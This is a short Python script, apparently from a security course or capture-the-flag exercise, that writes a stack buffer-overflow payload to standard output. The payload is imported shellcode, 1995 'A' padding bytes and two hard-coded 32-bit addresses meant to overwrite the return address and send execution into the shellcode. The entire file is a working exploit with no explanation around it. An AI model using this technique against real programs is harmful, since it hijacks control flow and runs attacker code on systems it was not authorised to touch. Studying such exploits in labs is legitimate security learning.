import sys
from shellcode import shellcode

addr = 0x8048c1d.to_bytes(4, "little")
ret_addr= 0xbffefa9c.to_bytes(4,"little")
sys.stdout.buffer.write(shellcode + b"A" * 1995 + addr+ ret_addr)